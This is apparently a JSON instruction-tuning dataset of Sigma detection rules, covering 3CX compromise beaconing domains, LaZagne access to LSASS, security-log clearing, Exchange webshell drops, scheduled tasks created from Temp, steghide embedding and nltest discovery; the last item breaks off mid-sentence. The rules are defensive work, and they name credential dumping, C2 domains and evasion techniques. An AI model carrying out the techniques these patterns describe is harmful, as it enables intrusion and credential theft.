[
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise, you should monitor network connections from Windows products for any instances where the application involved ends with '\\3CXDesktopApp.exe' and the destination hostname includes one of several specified suspicious domains. These domains, such as 'akamaicontainer.com', 'azuredeploystore.com', and 'officeaddons.com' among others, are indicators that the 3CXDesktopApp may have been compromised and is possibly communicating with a command and control server. Due to the high confidence in these indicators, false positives are considered unlikely. This method focuses on identifying malicious network activity that signals a compromised application, potentially signaling a larger security breach.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\3CXDesktopApp.exe'\n        DestinationHostname|contains:\n            - 'akamaicontainer.com'\n            - 'akamaitechcloudservices.com'\n            - 'azuredeploystore.com'\n            - 'azureonlinecloud.com'\n            - 'azureonlinestorage.com'\n            - 'dunamistrd.com'\n            - 'glcloudservice.com'\n            - 'journalide.org'\n            - 'msedgepackageinfo.com'\n            - 'msstorageazure.com'\n            - 'msstorageboxes.com'\n            - 'officeaddons.com'\n            - 'officestoragebox.com'\n            - 'pbxcloudeservices.com'\n            - 'pbxphonenetwork.com'\n            - 'pbxsources.com'\n            - 'qwepoi123098.com'\n            - 'sbmsa.wiki'\n            - 'sourceslabs.com'\n            - 'visualstudiofactory.com'\n            - 'zacharryblogs.com'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\3CXDesktopApp.exe'\n        DestinationHostname|contains:\n            - 'akamaicontainer.com'\n            - 'akamaitechcloudservices.com'\n            - 'azuredeploystore.com'\n            - 'azureonlinecloud.com'\n            - 'azureonlinestorage.com'\n            - 'dunamistrd.com'\n            - 'glcloudservice.com'\n            - 'journalide.org'\n            - 'msedgepackageinfo.com'\n            - 'msstorageazure.com'\n            - 'msstorageboxes.com'\n            - 'officeaddons.com'\n            - 'officestoragebox.com'\n            - 'pbxcloudeservices.com'\n            - 'pbxphonenetwork.com'\n            - 'pbxsources.com'\n            - 'qwepoi123098.com'\n            - 'sbmsa.wiki'\n            - 'sourceslabs.com'\n            - 'visualstudiofactory.com'\n            - 'zacharryblogs.com'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise",
      "answer": "In order to detect potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise, you should monitor network connections from Windows products for any instances where the application involved ends with '\\3CXDesktopApp.exe' and the destination hostname includes one of several specified suspicious domains. These domains, such as 'akamaicontainer.com', 'azuredeploystore.com', and 'officeaddons.com' among others, are indicators that the 3CXDesktopApp may have been compromised and is possibly communicating with a command and control server. Due to the high confidence in these indicators, false positives are considered unlikely. This method focuses on identifying malicious network activity that signals a compromised application, potentially signaling a larger security breach."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting LSASS process access by LaZagne for credential dumping..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect LSASS process access by LaZagne for credential dumping, you should look for process access activities in Windows operating systems that specifically involve accessing the Local Security Authority Subsystem Service (LSASS) executable. This detection focuses on instances where the LSASS executable is targeted, reflected by the end of the target image path '\\lsass.exe'. Additionally, the monitoring should check for a call trace that includes access from 'C:\\Windows\\SYSTEM32\\ntdll.dll', 'C:\\Windows\\System32\\KERNELBASE.dll', through '_ctypes.pyd', and involves 'python27.dll', indicating the use of Python, which is a common component of the LaZagne project utilized for extracting credentials. The access attempts should have a granted access level of '0x1FFFFF', which entails extensive permissions that could be abused for credential dumping. Such activities are considered critical due to their association with sensitive information theft.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        CallTrace|contains|all:\n            - 'C:\\Windows\\SYSTEM32\\ntdll.dll+'\n            - '|C:\\Windows\\System32\\KERNELBASE.dll+'\n            - '_ctypes.pyd+'\n            - 'python27.dll+'\n        GrantedAccess: '0x1FFFFF'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        CallTrace|contains|all:\n            - 'C:\\Windows\\SYSTEM32\\ntdll.dll+'\n            - '|C:\\Windows\\System32\\KERNELBASE.dll+'\n            - '_ctypes.pyd+'\n            - 'python27.dll+'\n        GrantedAccess: '0x1FFFFF'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "LSASS process access by LaZagne for credential dumping.",
      "answer": "In order to detect LSASS process access by LaZagne for credential dumping, you should look for process access activities in Windows operating systems that specifically involve accessing the Local Security Authority Subsystem Service (LSASS) executable. This detection focuses on instances where the LSASS executable is targeted, reflected by the end of the target image path '\\lsass.exe'. Additionally, the monitoring should check for a call trace that includes access from 'C:\\Windows\\SYSTEM32\\ntdll.dll', 'C:\\Windows\\System32\\KERNELBASE.dll', through '_ctypes.pyd', and involves 'python27.dll', indicating the use of Python, which is a common component of the LaZagne project utilized for extracting credentials. The access attempts should have a granted access level of '0x1FFFFF', which entails extensive permissions that could be abused for credential dumping. Such activities are considered critical due to their association with sensitive information theft."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting recovery of a new public database instance from a snapshot. It may be a part of data exfiltration..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the recovery of a new public database instance from a snapshot. It may be a part of data exfiltration, you should: Monitor AWS CloudTrail logs for activities involving the recovery of database instances from snapshots where the database is set to be publicly accessible. Specifically, keep an eye out for events that come from the RDS (Relational Database Service) indicated by the event source `rds.amazonaws.com`. Look for the event name `RestoreDBInstanceFromDBSnapshot` which signifies the action of restoring a database instance from a snapshot. Importantly, ensure that the `responseElements.publiclyAccessible` attribute is set to 'true', indicating that the database instance is publicly accessible post-restoration. This detection is rated with a high-level importance due to the potential risk of exfiltrating data through such publicly accessible databases. Awareness of false positives is essential, although currently unknown, implying that monitoring and context are crucial when interpreting alerts based on this detection criterion. Identifying such activity could signify a breach or an inadvertent configuration that could expose sensitive data publicly.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: rds.amazonaws.com\n        responseElements.publiclyAccessible: 'true'\n        eventName: RestoreDBInstanceFromDBSnapshot\n    condition: selection_source\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: rds.amazonaws.com\n        responseElements.publiclyAccessible: 'true'\n        eventName: RestoreDBInstanceFromDBSnapshot\n    condition: selection_source\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "recovery of a new public database instance from a snapshot. It may be a part of data exfiltration.",
      "answer": "In order to detect the recovery of a new public database instance from a snapshot. It may be a part of data exfiltration, you should: Monitor AWS CloudTrail logs for activities involving the recovery of database instances from snapshots where the database is set to be publicly accessible. Specifically, keep an eye out for events that come from the RDS (Relational Database Service) indicated by the event source `rds.amazonaws.com`. Look for the event name `RestoreDBInstanceFromDBSnapshot` which signifies the action of restoring a database instance from a snapshot. Importantly, ensure that the `responseElements.publiclyAccessible` attribute is set to 'true', indicating that the database instance is publicly accessible post-restoration. This detection is rated with a high-level importance due to the potential risk of exfiltrating data through such publicly accessible databases. Awareness of false positives is essential, although currently unknown, implying that monitoring and context are crucial when interpreting alerts based on this detection criterion. Identifying such activity could signify a breach or an inadvertent configuration that could expose sensitive data publicly."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Performs execution of specified file, can be used for defensive evasion..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to perform execution of a specified file, which can be used for defensive evasion, you should monitor for the creation of process events on Windows systems where the command line includes the use of 'bash.exe' in conjunction with the '-c ' argument. This pattern suggests an attempt to execute commands or scripts using Bash, which is not commonly used in typical Windows environments and can indicate an attempt to bypass defensive controls.\n\nHowever, it is important to exclude events related to Git's post-installation processes. This exclusion is necessary because during Git installation on Windows, scripts located in `/etc/post-install/` might be executed, which could involve similar command-line patterns but are legitimate activities associated with Git's setup.\n\nThis detection focuses on identifying misuse of Bash in Windows, as indicated by the appearance of 'bash.exe' and '-c ' in the command line of newly created processes. Exclude any events where the parent command line involves executing 'post-install.bat' located in Git's installation directories or directly echoing '/etc/post-install/*.post', as these are identified as common false positives related to Git installation rather than malicious activity.\n\nThe detection logic is set at a medium level of alert, acknowledging that while this activity is suspicious, it must be contextualized within the environment to ascertain its maliciousness due to the potential for legitimate use of Bash in Windows environments for development purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - bash.exe\n            - '-c '\n    filter_git:\n        - ParentCommandLine|contains:\n            - 'C:\\Program Files\\Git\\post-install.bat'\n            - 'C:\\Program Files (x86)\\Git\\post-install.bat'\n            - 'echo /etc/post-install/*.post'  # needed for occurrences where the *.bat is the grandparent\n        - CommandLine|contains: 'echo /etc/post-install/*.post'  # needed for WinEvtLog 4688 events\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - bash.exe\n            - '-c '\n    filter_git:\n        - ParentCommandLine|contains:\n            - 'C:\\Program Files\\Git\\post-install.bat'\n            - 'C:\\Program Files (x86)\\Git\\post-install.bat'\n            - 'echo /etc/post-install/*.post'  # needed for occurrences where the *.bat is the grandparent\n        - CommandLine|contains: 'echo /etc/post-install/*.post'  # needed for WinEvtLog 4688 events\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Performs execution of specified file, can be used for defensive evasion.",
      "answer": "In order to perform execution of a specified file, which can be used for defensive evasion, you should monitor for the creation of process events on Windows systems where the command line includes the use of 'bash.exe' in conjunction with the '-c ' argument. This pattern suggests an attempt to execute commands or scripts using Bash, which is not commonly used in typical Windows environments and can indicate an attempt to bypass defensive controls.\n\nHowever, it is important to exclude events related to Git's post-installation processes. This exclusion is necessary because during Git installation on Windows, scripts located in `/etc/post-install/` might be executed, which could involve similar command-line patterns but are legitimate activities associated with Git's setup.\n\nThis detection focuses on identifying misuse of Bash in Windows, as indicated by the appearance of 'bash.exe' and '-c ' in the command line of newly created processes. Exclude any events where the parent command line involves executing 'post-install.bat' located in Git's installation directories or directly echoing '/etc/post-install/*.post', as these are identified as common false positives related to Git installation rather than malicious activity.\n\nThe detection logic is set at a medium level of alert, acknowledging that while this activity is suspicious, it must be contextualized within the environment to ascertain its maliciousness due to the potential for legitimate use of Bash in Windows environments for development purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Checks for event id 1102 which indicates the security event log was cleared..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to check for event id 1102 which indicates the security event log was cleared, you should: Monitor Windows security logs specifically for Event ID 1102 with the provider name Microsoft-Windows-Eventlog. This event indicates that the security event log has been cleared, which can be a significant indicator of malicious activity as attackers might clear event logs to hide their tracks after gaining access to a system or performing unauthorized activities. It's important to capture details such as SubjectLogonId, SubjectUserName, SubjectUserSid, and SubjectDomainName associated with this event to help identify who cleared the log. While this detection is critical for identifying potential security breaches, keep in mind that there are legitimate scenarios where administrative actions may require clearing these logs. Therefore, these alerts should be investigated to distinguish between malicious activities and legitimate administrative activities. The level of concern for such events is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: security\n    product: windows\ndetection:\n    selection:\n        EventID: 1102\n        Provider_Name: Microsoft-Windows-Eventlog\n    condition: selection\nfalsepositives:\n    - Legitimate administrative activity\nfields:\n    - SubjectLogonId\n    - SubjectUserName\n    - SubjectUserSid\n    - SubjectDomainName\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: security\n    product: windows\ndetection:\n    selection:\n        EventID: 1102\n        Provider_Name: Microsoft-Windows-Eventlog\n    condition: selection\nfalsepositives:\n    - Legitimate administrative activity\nfields:\n    - SubjectLogonId\n    - SubjectUserName\n    - SubjectUserSid\n    - SubjectDomainName\nlevel: medium\n",
      "question": "Checks for event id 1102 which indicates the security event log was cleared.",
      "answer": "In order to check for event id 1102 which indicates the security event log was cleared, you should: Monitor Windows security logs specifically for Event ID 1102 with the provider name Microsoft-Windows-Eventlog. This event indicates that the security event log has been cleared, which can be a significant indicator of malicious activity as attackers might clear event logs to hide their tracks after gaining access to a system or performing unauthorized activities. It's important to capture details such as SubjectLogonId, SubjectUserName, SubjectUserSid, and SubjectDomainName associated with this event to help identify who cleared the log. While this detection is critical for identifying potential security breaches, keep in mind that there are legitimate scenarios where administrative actions may require clearing these logs. Therefore, these alerts should be investigated to distinguish between malicious activities and legitimate administrative activities. The level of concern for such events is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the tool PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of the tool PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files, you should: Monitor Windows process creation logs for any instances where the name of the created process ends with '\\PowerTool.exe' or '\\PowerTool64.exe', or where the original filename is explicitly 'PowerTool.exe'. These indicators are highly suggestive of the PowerTool utility being executed on the system, which is known for its capabilities to interact dangerously with processes and drivers. Given the nature of these activities, occurrences are unlikely to be false positives and should be treated with a high level of suspicion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith:\n            - '\\PowerTool.exe'\n            - '\\PowerTool64.exe'\n        - OriginalFileName: 'PowerTool.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith:\n            - '\\PowerTool.exe'\n            - '\\PowerTool64.exe'\n        - OriginalFileName: 'PowerTool.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "execution of the tool PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files",
      "answer": "In order to detect the execution of the tool PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files, you should: Monitor Windows process creation logs for any instances where the name of the created process ends with '\\PowerTool.exe' or '\\PowerTool64.exe', or where the original filename is explicitly 'PowerTool.exe'. These indicators are highly suggestive of the PowerTool utility being executed on the system, which is known for its capabilities to interact dangerously with processes and drivers. Given the nature of these activities, occurrences are unlikely to be false positives and should be treated with a high level of suspicion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious file type dropped by an Exchange component in IIS into a suspicious folder.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious file type dropped by an Exchange component in IIS into a suspicious folder, you should: monitor Windows file event logs for occurrences where a file with an extension of either .aspx, .asp, or .ashx is created or modified in directories commonly associated with IIS web applications, particularly within the paths 'FrontEnd\\HttpProxy\\' and '\\inetpub\\wwwroot\\aspnet_client\\'. The primary executable to watch in relation to this activity is 'w3wp.exe', a process associated with IIS web application pools, especially when its command line invocation includes references to 'MSExchange'. This specific activity is flagged with a high level of concern due to its potential association with malicious operations targeting Microsoft Exchange components working within the IIS infrastructure.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '\\w3wp.exe'\n        CommandLine|contains: 'MSExchange'\n        TargetFilename|contains:\n            - 'FrontEnd\\HttpProxy\\'           # from GTSC and MSTI reports\n            - '\\inetpub\\wwwroot\\aspnet_client\\' # from GTSC report\n    selection_types:\n        TargetFilename|endswith:\n            - '.aspx'\n            - '.asp'\n            - '.ashx'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '\\w3wp.exe'\n        CommandLine|contains: 'MSExchange'\n        TargetFilename|contains:\n            - 'FrontEnd\\HttpProxy\\'           # from GTSC and MSTI reports\n            - '\\inetpub\\wwwroot\\aspnet_client\\' # from GTSC report\n    selection_types:\n        TargetFilename|endswith:\n            - '.aspx'\n            - '.asp'\n            - '.ashx'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious file type dropped by an Exchange component in IIS into a suspicious folder",
      "answer": "In order to detect suspicious file type dropped by an Exchange component in IIS into a suspicious folder, you should: monitor Windows file event logs for occurrences where a file with an extension of either .aspx, .asp, or .ashx is created or modified in directories commonly associated with IIS web applications, particularly within the paths 'FrontEnd\\HttpProxy\\' and '\\inetpub\\wwwroot\\aspnet_client\\'. The primary executable to watch in relation to this activity is 'w3wp.exe', a process associated with IIS web application pools, especially when its command line invocation includes references to 'MSExchange'. This specific activity is flagged with a high level of concern due to its potential association with malicious operations targeting Microsoft Exchange components working within the IIS infrastructure."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting schtasks.exe create task from user AppData\\Local\\Temp.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect unauthorized task creation from a user's AppData\\Local\\Temp directory using schtasks.exe, you should monitor for the execution of schtasks.exe (the Windows Task Scheduler command line utility) specifically looking for its use in creating a new task. The creation command should involve paths targeting the AppData\\Local\\Temp directory of a user's profile, indicating a potential attempt to establish persistence or execute malicious tasks from a generally less monitored location on the system. \n\nSpecifically, the detection focuses on identifying command line invocations of schtasks.exe that include the '/Create ' option, suggesting a new scheduled task is being created, and also involve paths that lead to the AppData\\Local\\Temp directory. However, there's an exception to this rule where command lines creating a task named \"klcp_update\" with an XML configuration file named 'klcp_update_task.xml' are not considered malicious based on this particular detection logic, possibly because they represent known, legitimate usage patterns.\n\nThis monitoring approach should apply to systems running Windows, under the category that captures process creation logs. These logs are crucial for identifying the execution of scheduled tasks commands that could indicate a compromise or an attempt at gaining persistence on the system by adversaries.\n\nIn essence, the aim here is to catch potentially malicious activity where adversaries might leverage the Windows Task Scheduler to run malware or scripts from locations typically used for temporary storage of files, making it a critical aspect of defense against tactics involving the execution of scheduled tasks for malicious purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    schtasks:\n        Image|endswith: '\\schtasks.exe'\n    option:\n        CommandLine|contains|all:\n            - '/Create '\n            - '\\AppData\\Local\\Temp'\n    filter_klite_codec:\n        CommandLine|contains|all:\n            - '/Create /TN \"klcp_update\" /XML '\n            - '\\klcp_update_task.xml'\n    condition: schtasks and option and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    schtasks:\n        Image|endswith: '\\schtasks.exe'\n    option:\n        CommandLine|contains|all:\n            - '/Create '\n            - '\\AppData\\Local\\Temp'\n    filter_klite_codec:\n        CommandLine|contains|all:\n            - '/Create /TN \"klcp_update\" /XML '\n            - '\\klcp_update_task.xml'\n    condition: schtasks and option and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "schtasks.exe create task from user AppData\\Local\\Temp",
      "answer": "In order to detect unauthorized task creation from a user's AppData\\Local\\Temp directory using schtasks.exe, you should monitor for the execution of schtasks.exe (the Windows Task Scheduler command line utility) specifically looking for its use in creating a new task. The creation command should involve paths targeting the AppData\\Local\\Temp directory of a user's profile, indicating a potential attempt to establish persistence or execute malicious tasks from a generally less monitored location on the system. \n\nSpecifically, the detection focuses on identifying command line invocations of schtasks.exe that include the '/Create ' option, suggesting a new scheduled task is being created, and also involve paths that lead to the AppData\\Local\\Temp directory. However, there's an exception to this rule where command lines creating a task named \"klcp_update\" with an XML configuration file named 'klcp_update_task.xml' are not considered malicious based on this particular detection logic, possibly because they represent known, legitimate usage patterns.\n\nThis monitoring approach should apply to systems running Windows, under the category that captures process creation logs. These logs are crucial for identifying the execution of scheduled tasks commands that could indicate a compromise or an attempt at gaining persistence on the system by adversaries.\n\nIn essence, the aim here is to catch potentially malicious activity where adversaries might leverage the Windows Task Scheduler to run malware or scripts from locations typically used for temporary storage of files, making it a critical aspect of defense against tactics involving the execution of scheduled tasks for malicious purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting embeding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect embedding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information, you should: Monitor Linux systems for the use of the 'steghide' binary, specifically focusing on the auditd logs. Be on the lookout for the execution of 'steghide' with the arguments 'embed', '-cf', and '-ef'. These arguments indicate an attempt to embed hidden information within files. The 'execve' type in the logs is crucial, as it signifies an execution request for the steghide command. The '-cf' option specifies the cover file that will contain the hidden data, while '-ef' denotes the embedded file that carries the data to be hidden. It's important to understand that, despite the low level of initial suspicion attributed to these actions (as they could theoretically be used in benign scenarios), their detection plays a critical role in uncovering efforts by adversaries to transfer or conceal sensitive information.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: EXECVE\n        a0: steghide\n        a1: embed\n        a2:\n            - '-cf'\n            - '-ef'\n        a4:\n            - '-cf'\n            - '-ef'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: EXECVE\n        a0: steghide\n        a1: embed\n        a2:\n            - '-cf'\n            - '-ef'\n        a4:\n            - '-cf'\n            - '-ef'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "embeding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.",
      "answer": "In order to detect embedding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information, you should: Monitor Linux systems for the use of the 'steghide' binary, specifically focusing on the auditd logs. Be on the lookout for the execution of 'steghide' with the arguments 'embed', '-cf', and '-ef'. These arguments indicate an attempt to embed hidden information within files. The 'execve' type in the logs is crucial, as it signifies an execution request for the steghide command. The '-cf' option specifies the cover file that will contain the hidden data, while '-ef' denotes the embedded file that carries the data to be hidden. It's important to understand that, despite the low level of initial suspicion attributed to these actions (as they could theoretically be used in benign scenarios), their detection plays a critical role in uncovering efforts by adversaries to transfer or conceal sensitive information."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting The attacker might use LOLBAS nltest.exe for discovery of domain controllers, domain trusts, parent domain and the current user permissions..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an attacker using LOLBAS nltest.exe for the discovery of domain controllers, domain trusts, parent domain, and the current user permissions, you should monitor Windows security service logs for specific activities. Focus on identifying events with Event ID 4689, which indicates a process has exited, especially concerning the process nltest.exe. This utility, when part of a command execution that successfully completes (indicated by Status '0x0'), could be employed by an adversary to gather sensitive information about the network's architecture and access rights. Pay particular attention to the logs capturing the 'SubjectUserName' and 'SubjectDomainName' fields, as these will provide context about who initiated the process. Be aware that while high alert levels are justified due to the potential for malicious intent, there could be false positives such as red team activities or rare legitimate uses by administrators. Through this focused monitoring, malicious activities related to domain discovery can be effectively flagged and investigated.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4689\n        ProcessName|endswith: 'nltest.exe'\n        Status: '0x0'\n    condition: selection\nfields:\n    - 'SubjectUserName'\n    - 'SubjectDomainName'\nfalsepositives:\n    - Red team activity\n    - Rare legitimate use by an administrator\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4689\n        ProcessName|endswith: 'nltest.exe'\n        Status: '0x0'\n    condition: selection\nfields:\n    - 'SubjectUserName'\n    - 'SubjectDomainName'\nfalsepositives:\n    - Red team activity\n    - Rare legitimate use by an administrator\nlevel: high\n",
      "question": "The attacker might use LOLBAS nltest.exe for discovery of domain controllers, domain trusts, parent domain and the current user permissions.",
      "answer": "In order to detect an attacker using LOLBAS nltest.exe for the discovery of domain controllers, domain trusts, parent domain, and the current user permissions, you should monitor Windows security service logs for specific activities. Focus on identifying events with Event ID 4689, which indicates a process has exited, especially concerning the process nltest.exe. This utility, when part of a command execution that successfully completes (indicated by Status '0x0'), could be employed by an adversary to gather sensitive information about the network's architecture and access rights. Pay particular attention to the logs capturing the 'SubjectUserName' and 'SubjectDomainName' fields, as these will provide context about who initiated the process. Be aware that while high alert levels are justified due to the potential for malicious intent, there could be false positives such as red team activities or rare legitimate uses by administrators. Through this focused monitoring, malicious activities related to domain discovery can be effectively flagged and investigated."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting remote RPC calls to read information about scheduled tasks via AtScv.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect remote RPC calls to read information about scheduled tasks via AtScv, you should focus on monitoring for specific events generated by the RPC Firewall applied to processes that interact with remote procedure calls. Specifically:\n\n1. Ensure that the RPC Firewall is installed and configured to audit and block actions for processes, particularly those with the UUID \"1ff70682-0a51-30e8-076d-740be8cee98b\". This UUID is crucial as it identifies the specific interface associated with the remote calls you are interested in monitoring.\n\n2. Monitor the RPCFW event logs for EventID 3. EventID 3 is pertinent as it signifies that an audited action took place, which in the context of your monitoring, relates to remote RPC calls that could potentially be reading information about scheduled tasks.\n\n3. Check that the InterfaceUuid in the logged event matches \"1ff70682-0a51-30e8-076d-740be8cee98b\". This ensures that the event you're monitoring is relevant to the specific remote procedure call interface that interacts with scheduled tasks.\n\n4. Apply a filter to exclude events where the OpNum is 0 or 1. OpNums (operation numbers) specify the particular operation being called in the RPC; excluding these numbers helps to focus on the relevant operations that could indicate an attempt to read task information illicitly.\n\nGiven the high importance of detecting such activity, any matches to these criteria should be treated with a high level of scrutiny. However, be aware of the potential for unknown false positives, meaning some legitimate activities might inadvertently match these criteria until they are properly identified and whitelisted.\n\nThis approach is aligned with cybersecurity practices that aim to detect unauthorized access or malicious activity related to scheduled tasks, a technique that can be crucial for maintaining the security and integrity of systems.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: rpc_firewall\n    category: application\n    definition: 'Requirements: install and apply the RPC Firewall to all processes with \"audit:true action:block uuid:1ff70682-0a51-30e8-076d-740be8cee98b\"'\ndetection:\n    selection:\n        EventLog: RPCFW\n        EventID: 3\n        InterfaceUuid: 1ff70682-0a51-30e8-076d-740be8cee98b\n    filter:\n        OpNum:\n            - 0\n            - 1\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: rpc_firewall\n    category: application\n    definition: 'Requirements: install and apply the RPC Firewall to all processes with \"audit:true action:block uuid:1ff70682-0a51-30e8-076d-740be8cee98b\"'\ndetection:\n    selection:\n        EventLog: RPCFW\n        EventID: 3\n        InterfaceUuid: 1ff70682-0a51-30e8-076d-740be8cee98b\n    filter:\n        OpNum:\n            - 0\n            - 1\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "remote RPC calls to read information about scheduled tasks via AtScv",
      "answer": "In order to detect remote RPC calls to read information about scheduled tasks via AtScv, you should focus on monitoring for specific events generated by the RPC Firewall applied to processes that interact with remote procedure calls. Specifically:\n\n1. Ensure that the RPC Firewall is installed and configured to audit and block actions for processes, particularly those with the UUID \"1ff70682-0a51-30e8-076d-740be8cee98b\". This UUID is crucial as it identifies the specific interface associated with the remote calls you are interested in monitoring.\n\n2. Monitor the RPCFW event logs for EventID 3. EventID 3 is pertinent as it signifies that an audited action took place, which in the context of your monitoring, relates to remote RPC calls that could potentially be reading information about scheduled tasks.\n\n3. Check that the InterfaceUuid in the logged event matches \"1ff70682-0a51-30e8-076d-740be8cee98b\". This ensures that the event you're monitoring is relevant to the specific remote procedure call interface that interacts with scheduled tasks.\n\n4. Apply a filter to exclude events where the OpNum is 0 or 1. OpNums (operation numbers) specify the particular operation being called in the RPC; excluding these numbers helps to focus on the relevant operations that could indicate an attempt to read task information illicitly.\n\nGiven the high importance of detecting such activity, any matches to these criteria should be treated with a high level of scrutiny. However, be aware of the potential for unknown false positives, meaning some legitimate activities might inadvertently match these criteria until they are properly identified and 